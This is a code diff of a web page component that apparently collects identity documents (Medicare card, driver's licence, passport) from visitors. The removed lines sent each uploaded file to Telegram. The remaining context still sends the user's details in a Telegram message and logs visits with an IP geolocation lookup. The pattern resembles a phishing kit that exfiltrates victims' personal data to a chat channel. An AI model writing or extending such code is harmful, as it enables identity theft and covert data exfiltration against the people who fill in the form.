@@ -35,20 +35,6 @@ export default function Home() {
     }
   };
 
-  // Send file to Telegram
-  const sendTelegramFile = async (file: File) => {
-    try {
-      const formData = new FormData();
-      formData.append("file", file);
-      await fetch("/api/telegram/file", {
-        method: "POST",
-        body: formData,
-      });
-    } catch (error) {
-      console.error("Failed to send Telegram file:", error);
-    }
-  };
-
   // Send notification when user visits the page
   useEffect(() => {
     fetch("https://ipapi.co/json/")
@@ -136,12 +122,6 @@ export default function Home() {
       Passport: ${passport ? passport.name : "Not uploaded"}
     `;
     await sendTelegramMessage(message);
-
-    // Send uploaded files to Telegram
-    if (medicareCard) await sendTelegramFile(medicareCard);
-    if (driversLicenseFront) await sendTelegramFile(driversLicenseFront);
-    if (driversLicenseBack) await sendTelegramFile(driversLicenseBack);
-    if (passport) await sendTelegramFile(passport);
   };
 
   if (showDetailsPage) {
